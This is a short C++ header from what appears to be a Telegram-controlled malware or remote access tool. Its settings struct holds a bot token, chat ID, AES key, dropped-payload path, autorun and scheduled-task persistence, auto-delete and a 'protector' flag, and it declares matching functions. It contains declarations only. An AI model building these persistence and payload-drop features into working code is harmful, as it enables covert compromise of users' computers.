/*
MIT License

Copyright (c) 2020 4B4DB4B3

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#pragma once
#ifndef MANAGER_H
#define MANAGER_H
#include "common.h"

namespace Manager {
	#pragma pack(push, 1)
	struct Settings {
		char botapi[128] = { 0 };
		char key[CryptoPP::AES::DEFAULT_KEYLENGTH] = { 0 };

		char chatid[128] = { 0 };
		char drop[128] = { 0 };
		bool drop_run;

		char scheduler_name[128] = { 0 };
		bool scheduler_state;

		char autorun[128] = { 0 };
		bool autorun_state;

		char client_delay[128] = { 0 };
		bool auto_delete;
		bool protector;
	};
	#pragma pack(pop)

	void ReadData(Settings* s);

	void Autorun(const char* path, const char* name);
	void Scheduler(const char* path, const char* name);

	long GetFileSize(const char* filename);
	bool FileExists(std::string name);

	std::string ToLower(std::string str);
	std::vector<std::string> split(std::string str, char delim);

	std::string EncryptStr(std::string text, std::string key);
	std::string DecryptStr(std::string text, std::string key);
}

#endif